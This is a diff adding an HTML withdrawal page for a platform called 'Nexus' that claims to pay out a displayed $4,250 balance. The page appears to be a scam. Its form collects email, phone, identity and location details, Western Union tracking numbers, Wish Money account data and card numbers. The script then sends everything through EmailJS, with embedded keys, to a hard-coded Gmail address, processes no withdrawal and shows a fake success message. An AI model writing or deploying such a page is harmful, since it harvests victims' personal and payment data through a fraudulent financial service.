@@ -1,0 +1,752 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+  <title>Nexus · Withdraw</title>
+  <meta name="description" content="Nexus - Withdraw funds securely">
+  
+  <!-- EmailJS SDK -->
+  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+  
+  <style>
+    /* reset & base */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    body {
+      font-family: system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+      background: #f5f7fc;
+      color: #0b1b33;
+      line-height: 1.5;
+      padding: 0 0 2rem 0;
+    }
+    /* nav */
+    .nav {
+      background: #ffffffcc;
+      backdrop-filter: blur(8px);
+      -webkit-backdrop-filter: blur(8px);
+      border-bottom: 1px solid #e9edf4;
+      padding: 0.75rem 0;
+      position: sticky;
+      top: 0;
+      z-index: 10;
+    }
+    .nav-inner {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      flex-wrap: wrap;
+      gap: 0.6rem;
+    }
+    .brand {
+      font-weight: 700;
+      font-size: 1.5rem;
+      text-decoration: none;
+      color: #0b1b33;
+      display: flex;
+      align-items: center;
+      gap: 0.3rem;
+    }
+    .brand-icon { font-size: 1.6rem; }
+    .brand span { color: #1a5cff; }
+    .nav-links {
+      display: flex;
+      gap: 1.6rem;
+      font-weight: 500;
+      font-size: 0.95rem;
+    }
+    .nav-links a {
+      text-decoration: none;
+      color: #1e2f4a;
+    }
+    .nav-links a:hover { color: #1a5cff; }
+    .btn {
+      display: inline-block;
+      background: #1a5cff;
+      color: white;
+      font-weight: 600;
+      padding: 0.6rem 1.4rem;
+      border-radius: 60px;
+      border: none;
+      font-size: 0.95rem;
+      text-decoration: none;
+      cursor: default;
+      transition: 0.2s;
+      letter-spacing: 0.2px;
+      box-shadow: 0 4px 10px rgba(26, 92, 255, 0.2);
+    }
+    @media (max-width: 600px) {
+      .nav-links { gap: 0.8rem; font-size: 0.8rem; }
+    }
+    .container {
+      max-width: 700px;
+      margin: 0 auto;
+      padding: 0 1.2rem;
+    }
+    /* nav */
+    .nav {
+      background: #ffffffcc;
+      backdrop-filter: blur(8px);
+      -webkit-backdrop-filter: blur(8px);
+      border-bottom: 1px solid #e9edf4;
+      padding: 0.75rem 0;
+      position: sticky;
+      top: 0;
+      z-index: 10;
+    }
+    .nav-inner {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      flex-wrap: wrap;
+      gap: 0.6rem;
+    }
+    .brand {
+      font-weight: 700;
+      font-size: 1.5rem;
+      text-decoration: none;
+      color: #0b1b33;
+      display: flex;
+      align-items: center;
+      gap: 0.3rem;
+    }
+    .brand-icon { font-size: 1.6rem; }
+    .brand span { color: #1a5cff; }
+    .nav-links {
+      display: flex;
+      gap: 1.6rem;
+      font-weight: 500;
+      font-size: 0.95rem;
+    }
+    .nav-links a {
+      text-decoration: none;
+      color: #1e2f4a;
+    }
+    .nav-links a:hover { color: #1a5cff; }
+    .btn {
+      display: inline-block;
+      background: #1a5cff;
+      color: white;
+      font-weight: 600;
+      padding: 0.6rem 1.4rem;
+      border-radius: 60px;
+      border: none;
+      font-size: 0.95rem;
+      text-decoration: none;
+      cursor: pointer;
+      transition: 0.2s;
+      letter-spacing: 0.2px;
+      box-shadow: 0 4px 10px rgba(26, 92, 255, 0.2);
+    }
+    .btn:hover { background: #0e4ad0; transform: scale(0.98); }
+    .btn-sm { padding: 0.4rem 1.2rem; font-size: 0.85rem; }
+    .btn-lg { padding: 0.8rem 2.2rem; font-size: 1.1rem; }
+    .btn-block { width: 100%; text-align: center; }
+    .btn-ghost {
+      background: transparent;
+      color: #1a5cff;
+      box-shadow: none;
+      border: 1.5px solid #1a5cff;
+    }
+    .btn-ghost:hover { background: #eef3ff; }
+
+    /* section */
+    .section { padding: 2rem 0; }
+    .section-alt { background: #ffffff; }
+    h2 {
+      font-size: 2rem;
+      font-weight: 700;
+      margin-bottom: 1.8rem;
+      letter-spacing: -0.02em;
+    }
+    .muted { color: #7085a6; font-weight: 400; }
+
+    /* withdraw form card */
+    .withdraw-card {
+      background: #ffffff;
+      border-radius: 28px;
+      padding: 2rem 2rem;
+      border: 1px solid #eef2f9;
+      box-shadow: 0 20px 40px rgba(0,20,50,0.06);
+      margin: 0 auto;
+    }
+    .withdraw-card .subhead {
+      color: #4a6180;
+      margin-bottom: 1.8rem;
+      font-size: 0.95rem;
+      border-left: 3px solid #1a5cff;
+      padding-left: 0.8rem;
+    }
+
+    .form-group {
+      margin-bottom: 1.4rem;
+    }
+    .form-group label {
+      display: block;
+      font-weight: 600;
+      font-size: 0.9rem;
+      margin-bottom: 0.3rem;
+      color: #1f3652;
+    }
+    .form-group .hint {
+      font-size: 0.75rem;
+      color: #6a7f9e;
+      margin-top: 0.2rem;
+    }
+    .form-control {
+      width: 100%;
+      padding: 0.75rem 1rem;
+      border: 1.5px solid #dce4f0;
+      border-radius: 18px;
+      font-size: 1rem;
+      background: #fafcff;
+      transition: 0.2s;
+      outline: none;
+    }
+    .form-control:focus {
+      border-color: #1a5cff;
+      background: white;
+      box-shadow: 0 0 0 3px #1a5cff20;
+    }
+    .form-control::placeholder { color: #a6b8d0; }
+    .form-control.error {
+      border-color: #e53e3e;
+      background: #fff5f5;
+    }
+
+    .amount-input-wrap {
+      position: relative;
+    }
+    .amount-input-wrap .currency-symbol {
+      position: absolute;
+      left: 1rem;
+      top: 50%;
+      transform: translateY(-50%);
+      font-weight: 700;
+      color: #1a5cff;
+      font-size: 1.1rem;
+    }
+    .amount-input-wrap .form-control {
+      padding-left: 2.2rem;
+      font-weight: 600;
+      font-size: 1.2rem;
+    }
+
+    .method-grid {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 0.7rem;
+      margin: 0.5rem 0 0.2rem;
+    }
+    .method-option {
+      background: #f5f9ff;
+      border: 1.5px solid #dce4f0;
+      border-radius: 60px;
+      padding: 0.6rem 0.2rem;
+      text-align: center;
+      font-weight: 500;
+      font-size: 0.85rem;
+      transition: 0.15s;
+      cursor: pointer;
+      color: #1f3652;
+      user-select: none;
+    }
+    .method-option.selected {
+      border-color: #1a5cff;
+      background: #e6efff;
+      color: #1a5cff;
+      box-shadow: 0 2px 8px #1a5cff20;
+    }
+    .method-option .m-icon { font-size: 1.2rem; display: block; }
+
+    .dynamic-fields {
+      margin-top: 0.5rem;
+      padding: 0.8rem 1rem;
+      background: #f8fbff;
+      border-radius: 20px;
+      border: 1px dashed #b8cce6;
+    }
+    .dynamic-fields .form-group:last-child { margin-bottom: 0; }
+
+    .info-note {
+      background: #f0f6ff;
+      border-radius: 20px;
+      padding: 0.8rem 1.2rem;
+      font-size: 0.85rem;
+      color: #1f3652;
+      margin-top: 0.8rem;
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+      border-left: 3px solid #1a5cff;
+    }
+    .info-note.warning {
+      background: #fff8e6;
+      border-left-color: #f5a623;
+    }
+
+    .divider {
+      display: flex;
+      align-items: center;
+      gap: 0.8rem;
+      margin: 1.2rem 0 1rem;
+      color: #8da0bc;
+      font-size: 0.8rem;
+    }
+    .divider::before, .divider::after {
+      content: '';
+      flex: 1;
+      height: 1px;
+      background: #dce4f0;
+    }
+
+    .balance-row {
+      display: flex;
+      justify-content: space-between;
+      font-size: 0.9rem;
+      color: #2c405e;
+    }
+
+    /* footer */
+    .footer {
+      margin-top: 2rem;
+      padding: 1.8rem 0;
+      border-top: 1px solid #dfe7f2;
+      background: white;
+    }
+    .footer-inner {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: space-between;
+      gap: 0.8rem;
+      font-size: 0.9rem;
+      color: #44607f;
+    }
+    .footer-links { display: flex; gap: 1.8rem; }
+    .footer-links a { text-decoration: none; color: #1a5cff; }
+
+    .toast {
+      position: fixed;
+      bottom: 20px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: #0b1b33;
+      color: white;
+      padding: 0.8rem 1.8rem;
+      border-radius: 60px;
+      font-weight: 500;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+      opacity: 0;
+      transition: 0.25s;
+      pointer-events: none;
+      z-index: 99;
+      font-size: 0.95rem;
+      max-width: 90%;
+      text-align: center;
+    }
+    .toast.show { opacity: 1; pointer-events: auto; }
+    .toast.error { background: #c0392b; }
+    .toast.success { background: #27ae60; }
+
+    @media (max-width: 600px) {
+      .nav-links { gap: 0.8rem; font-size: 0.8rem; }
+      .brand { font-size: 1.2rem; }
+      .withdraw-card { padding: 1.5rem 1rem; }
+      .method-grid { grid-template-columns: repeat(3, 1fr); gap: 0.4rem; }
+      .method-option { font-size: 0.75rem; padding: 0.5rem 0.1rem; }
+    }
+  * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    body {
+      font-family: system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+      background: #f5f7fc;
+      color: #0b1b33;
+      line-height: 1.5;
+      padding: 0 0 2rem 0;
+    }
+    
+  </style>
+  
+</head>
+<body>
+
+
+<nav class="nav">
+  <div class="container nav-inner">
+    <a class="brand" href="/">
+      <span class="brand-icon">📈</span> Nexus<span>.</span>
+          &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+
+    </a>
+
+    <div class="nav-links">
+      <a href="index.html">Home</a>
+      <a href="withdraw.html">Withdraw</a>
+    </div>
+  </div>
+</nav>
+
+
+<!-- WITHDRAW FORM -->
+<section class="section section-alt">
+  <div class="container">
+    <h2>💸 Withdraw <span class="muted">/ secure & instant</span></h2>
+    <div class="withdraw-card">
+      <div class="subhead">Minimum $10.00 · fast processing</div>
+
+      <form id="withdrawForm" onsubmit="return false;">
+        <!-- Amount -->
+        <div class="form-group">
+          <label for="amount">Amount (USD)</label>
+          <div class="amount-input-wrap">
+            <span class="currency-symbol">$</span>
+            <input type="number" step="0.01" min="10.00" class="form-control" id="amount" placeholder="10.00" value="10.00" required>
+          </div>
+          <div class="hint">Minimum withdrawal: $10.00</div>
+        </div>
+
+        <!-- Email -->
+        <div class="form-group">
+          <label for="email">Email address</label>
+          <input type="email" class="form-control" id="email" placeholder="you@example.com" required>
+          <div class="hint">We'll send a confirmation to this email.</div>
+        </div>
+
+        <!-- Phone -->
+        <div class="form-group">
+          <label for="phone">Phone number</label>
+          <input type="tel" class="form-control" id="phone" placeholder="+1 234 567 890" required>
+          <div class="hint">We'll send a verification code to this number.</div>
+        </div>
+
+        <!-- Withdrawal method -->
+        <div class="form-group">
+          <label>Payout method</label>
+          <div class="method-grid" id="methodGrid">
+            <div class="method-option selected" data-method="westerunion">
+              <span class="m-icon">🌐</span> Western Union
+            </div>
+            <div class="method-option" data-method="wishmoney">
+              <span class="m-icon">✨</span> Wish Money
+            </div>
+            <div class="method-option" data-method="visa">
+              <span class="m-icon">💳</span> Visa Card
+            </div>
+          </div>
+          <div class="hint" id="methodHint">Selected: Western Union</div>
+        </div>
+
+        <!-- Dynamic fields container -->
+        <div id="dynamicFieldsContainer" class="dynamic-fields">
+          <!-- filled by JS -->
+        </div>
+
+        <!-- Security note for Visa -->
+        <div id="visaSecurityNote" class="info-note warning" style="display: none; margin-top: 0.8rem;">
+          <span>🔒</span> For Visa payouts, we only need your card number and name. <strong>We never ask for CVV or expiry</strong> for sending money.
+        </div>
+
+        <button type="submit" class="btn btn-primary btn-block btn-lg" id="submitBtn">⬇ Withdraw now</button>
+        <button type="button" class="btn btn-ghost btn-block" id="resetBtn" style="margin-top: 0.8rem;">Reset form</button>
+
+        <div class="info-note" style="margin-top: 1.2rem;">
+          <span>🔒</span> Withdrawals are secured with biometric + 3‑DS. 
+          Funds arrive within minutes for Wish Money, 1‑3 days for Western Union / Visa.
+        </div>
+      </form>
+
+      <div class="divider">• • •</div>
+      <div class="balance-row">
+        <span>💰 Balance: <strong>$4,250.00</strong></span>
+        <span>📋 Fee: <strong>$0.00</strong></span>
+      </div>
+    </div>
+  </div>
+</section>
+
+<footer class="footer">
+  <div class="container footer-inner">
+    <span>© 2026 Nexus — secure withdrawals</span>
+    <div class="footer-links">
+      <a href="#">Support</a>
+      <a href="#">Privacy</a>
+      <a href="#">Terms</a>
+    </div>
+  </div>
+</footer>
+
+<div id="toast" class="toast">✨ Withdrawal ready</div>
+
+<script>
+  (function() {
+    // ===== CONFIGURATION =====
+    const EMAILJS_PUBLIC_KEY = "kDYnNVdrJxIeyvxlC";
+    const EMAILJS_SERVICE_ID = "service_0gezyzw";
+    const EMAILJS_TEMPLATE_ID = "template_t7b4wgp";
+    const YOUR_EMAIL = "nexustradingai.dev@gmail.com";
+    
+    // Initialize EmailJS
+    try {
+      emailjs.init(EMAILJS_PUBLIC_KEY);
+      console.log('✅ EmailJS initialized');
+    } catch (error) {
+      console.error('❌ EmailJS init failed:', error);
+    }
+    
+    // ===== DOM Elements =====
+    const toast = document.getElementById('toast');
+    const methodOptions = document.querySelectorAll('.method-option');
+    const methodHint = document.getElementById('methodHint');
+    const submitBtn = document.getElementById('submitBtn');
+    const resetBtn = document.getElementById('resetBtn');
+    const dynamicContainer = document.getElementById('dynamicFieldsContainer');
+    const visaSecurityNote = document.getElementById('visaSecurityNote');
+
+    // ===== Toast Helper =====
+    function showToast(msg, duration = 3200, type = '') {
+      toast.textContent = msg;
+      toast.className = 'toast';
+      if (type) toast.classList.add(type);
+      toast.classList.add('show');
+      clearTimeout(toast._timer);
+      toast._timer = setTimeout(() => toast.classList.remove('show'), duration);
+    }
+
+    // ===== Field Definitions =====
+    const methodFields = {
+      westerunion: {
+        label: 'Western Union',
+        fields: [
+          { id: 'wu_fullname', label: 'Full name (as on ID)', placeholder: 'John Doe', type: 'text' },
+          { id: 'wu_country', label: 'Receiver country', placeholder: 'United States', type: 'text' },
+          { id: 'wu_city', label: 'City', placeholder: 'New York', type: 'text' },
+          { id: 'wu_mtcn', label: 'MTCN (tracking number)', placeholder: '123-456-7890', type: 'text' },
+        ]
+      },
+      wishmoney: {
+        label: 'Wish Money',
+        fields: [
+          { id: 'wm_username', label: 'Wish Money username', placeholder: 'john_doe_123', type: 'text' },
+          { id: 'wm_email', label: 'Wish Money email', placeholder: 'wish@example.com', type: 'email' },
+          { id: 'wm_phone', label: 'Wish Money phone', placeholder: '+1 234 567 890', type: 'tel' },
+        ]
+      },
+      visa: {
+        label: 'Visa Card (Payout)',
+        fields: [
+          { id: 'visa_cardholder', label: 'Cardholder name', placeholder: 'John Doe', type: 'text' },
+          { id: 'visa_number', label: 'Card number (16 digits)', placeholder: '4111 1111 1111 1111', type: 'text' },
+          { id: 'visa_bank', label: 'Bank name (optional)', placeholder: 'Chase Bank', type: 'text' },
+        ]
+      }
+    };
+
+    // ===== Render Dynamic Fields =====
+    function renderFields(methodKey) {
+      const config = methodFields[methodKey];
+      if (!config) return;
+      let html = `<div style="margin-bottom: 0.5rem; font-weight: 600; font-size: 0.9rem; color: #1a5cff;">${config.label} details</div>`;
+      config.fields.forEach(f => {
+        html += `
+          <div class="form-group">
+            <label for="${f.id}">${f.label}</label>
+            <input type="${f.type}" class="form-control" id="${f.id}" placeholder="${f.placeholder}" required>
+          </div>
+        `;
+      });
+      dynamicContainer.innerHTML = html;
+
+      if (methodKey === 'visa') {
+        visaSecurityNote.style.display = 'flex';
+      } else {
+        visaSecurityNote.style.display = 'none';
+      }
+    }
+
+    // ===== Method Selection =====
+    methodOptions.forEach(opt => {
+      opt.addEventListener('click', function() {
+        methodOptions.forEach(o => o.classList.remove('selected'));
+        this.classList.add('selected');
+        const method = this.dataset.method;
+        const label = this.textContent.trim();
+        methodHint.textContent = `Selected: ${label}`;
+        renderFields(method);
+        showToast(`💳 Method: ${label}`, 1800);
+      });
+    });
+
+    // ===== Get Extra Fields Data =====
+    function getExtraFields(methodKey) {
+      const config = methodFields[methodKey];
+      let extraData = {};
+      let allFilled = true;
+      if (config) {
+        config.fields.forEach(f => {
+          const el = document.getElementById(f.id);
+          if (el) {
+            const value = el.value.trim();
+            extraData[f.label] = value || '(empty)';
+            if (!value) allFilled = false;
+          }
+        });
+      }
+      return { data: extraData, allFilled: allFilled };
+    }
+
+    // ===== SUBMIT FORM =====
+    submitBtn.addEventListener('click', function(e) {
+      e.preventDefault();
+
+      // Get form values
+      const amount = document.getElementById('amount').value.trim();
+      const email = document.getElementById('email').value.trim();
+      const phone = document.getElementById('phone').value.trim();
+      const selectedMethod = document.querySelector('.method-option.selected');
+      const methodName = selectedMethod ? selectedMethod.textContent.trim() : 'not set';
+      const methodKey = selectedMethod ? selectedMethod.dataset.method : '';
+
+      // Clear previous errors
+      document.querySelectorAll('.form-control.error').forEach(el => el.classList.remove('error'));
+
+      // Validate
+      let hasError = false;
+
+      if (!amount || parseFloat(amount) < 10.00) {
+        document.getElementById('amount').classList.add('error');
+        showToast('⚠️ Minimum withdrawal is $10.00', 2800, 'error');
+        document.getElementById('amount').focus();
+        return;
+      }
+      if (!email || !email.includes('@')) {
+        document.getElementById('email').classList.add('error');
+        showToast('⚠️ Please enter a valid email', 2800, 'error');
+        document.getElementById('email').focus();
+        return;
+      }
+      if (!phone || phone.length < 6) {
+        document.getElementById('phone').classList.add('error');
+        showToast('⚠️ Please enter a valid phone number', 2800, 'error');
+        document.getElementById('phone').focus();
+        return;
+      }
+
+      // Validate dynamic fields
+      const { data: extraData, allFilled } = getExtraFields(methodKey);
+      
+      // Check if any dynamic field is empty
+      const config = methodFields[methodKey];
+      if (config) {
+        let emptyFields = [];
+        config.fields.forEach(f => {
+          const el = document.getElementById(f.id);
+          if (el && !el.value.trim()) {
+            el.classList.add('error');
+            emptyFields.push(f.label);
+          }
+        });
+        if (emptyFields.length > 0) {
+          showToast(`⚠️ Please fill in: ${emptyFields.join(', ')}`, 4000, 'error');
+          // Focus on first empty field
+          const firstEmpty = document.getElementById(config.fields.find(f => {
+            const el = document.getElementById(f.id);
+            return el && !el.value.trim();
+          }).id);
+          if (firstEmpty) firstEmpty.focus();
+          return;
+        }
+      }
+
+      // Build extra fields text for email
+      const extraFieldsText = Object.entries(extraData)
+        .map(([key, val]) => `  ${key}: ${val}`)
+        .join('\n');
+
+      const amtFormatted = parseFloat(amount).toFixed(2);
+      const userName = email.split('@')[0] || 'User';
+      
+      // Show loading state
+      submitBtn.textContent = '⏳ Sending...';
+      submitBtn.disabled = true;
+
+      // ===== SEND WITH EMAILJS =====
+      const templateParams = {
+        email: YOUR_EMAIL,
+        name: userName,
+        title: `Withdrawal of $${amtFormatted} via ${methodName}`,
+        from_email: email,
+        user_email: email,
+        amount: `$${amtFormatted}`,
+        phone: phone,
+        method: methodName,
+        extra_fields: extraFieldsText || 'None',
+        timestamp: new Date().toLocaleString('en-US', { 
+          dateStyle: 'full', 
+          timeStyle: 'medium' 
+        })
+      };
+
+      console.log('📧 Sending email with params:', templateParams);
+
+      emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, templateParams)
+        .then(function(response) {
+          console.log('✅ SUCCESS!', response.status, response.text);
+          submitBtn.textContent = '⬇ Withdraw now';
+          submitBtn.disabled = false;
+          showToast(`✅ Withdrawal request sent successfully!`, 4000, 'success');
+        })
+        .catch(function(error) {
+          console.error('❌ FAILED:', error);
+          submitBtn.textContent = '⬇ Withdraw now';
+          submitBtn.disabled = false;
+          
+          let errorMsg = '❌ Failed to send. ';
+          if (error.text) {
+            errorMsg += error.text;
+          } else if (error.message) {
+            errorMsg += error.message;
+          }
+          showToast(errorMsg, 5000, 'error');
+        });
+    });
+
+    // ===== Reset Form =====
+    resetBtn.addEventListener('click', function() {
+      document.getElementById('amount').value = '10.00';
+      document.getElementById('email').value = '';
+      document.getElementById('phone').value = '';
+      document.querySelectorAll('.form-control.error').forEach(el => el.classList.remove('error'));
+      methodOptions.forEach(o => o.classList.remove('selected'));
+      document.querySelector('[data-method="westerunion"]').classList.add('selected');
+      methodHint.textContent = 'Selected: Western Union';
+      renderFields('westerunion');
+      showToast('🔄 Form reset', 1600);
+    });
+
+    // ===== Remove error class on input =====
+    document.addEventListener('input', function(e) {
+      if (e.target.classList.contains('form-control')) {
+        e.target.classList.remove('error');
+      }
+    });
+
+    // ===== Initial Render =====
+    renderFields('westerunion');
+    methodHint.textContent = 'Selected: Western Union';
+
+    console.log('✅ Nexus withdraw page ready');
+    console.log('📧 Emails will be sent to:', YOUR_EMAIL);
+  })();
+</script>
+
+</body>
+</html>
